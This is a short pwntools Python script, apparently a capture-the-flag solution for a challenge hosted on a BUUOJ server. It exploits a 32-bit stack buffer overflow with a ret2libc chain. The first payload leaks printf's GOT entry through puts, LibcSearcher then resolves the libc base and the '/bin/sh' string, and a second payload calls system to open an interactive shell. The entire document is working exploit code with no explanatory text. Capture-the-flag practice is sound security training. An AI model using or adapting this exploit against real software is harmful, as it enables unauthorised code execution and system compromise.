from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25761)
elf = ELF('./pwn')

io.sendlineafter(b'Please input admin password:', b'administrator')

payload = cyclic(76) + p32(elf.plt['puts']) + p32(elf.symbols['main']) + p32(elf.got['printf'])

io.sendlineafter(b'0.Exit\n:', b'1')
io.sendlineafter(b'Please input new log info:', payload)
io.sendlineafter(b'0.Exit\n:', b'4')

io.recvuntil(p32(elf.got['printf']) + b'\n')
printf = u32(io.recv(4))

libc = LibcSearcher('printf', printf)
base = printf - libc.dump('printf')
binsh = base + libc.dump('str_bin_sh')

io.sendlineafter(b'Please input admin password:', b'administrator')

payload = cyclic(76) + p32(elf.plt['system']) + p32(0xdeadbeef) + p32(binsh)
io.sendlineafter(b'0.Exit\n:', b'1')
io.sendlineafter(b'Please input new log info:', payload)
io.sendlineafter(b'0.Exit\n:', b'4')
io.interactive()